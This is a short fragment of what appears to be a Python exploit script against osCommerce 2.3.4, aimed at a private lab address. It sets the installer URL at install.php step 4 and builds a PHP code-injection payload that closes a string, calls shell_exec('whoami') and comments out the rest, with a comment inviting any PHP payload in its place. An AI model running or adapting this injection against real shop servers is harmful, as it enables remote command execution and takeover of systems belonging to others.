...
base_url = "http://10.10.164.71:8080/oscommerce-2.3.4/catalog/"
target_url = "http://10.10.164.71:8080/oscommerce-2.3.4/catalog/install/install.php?step=4"
...
payload = '\");'
payload += 'shell_exec("whoami");'    # this is where you enter you PHP payload
payload += '/*'
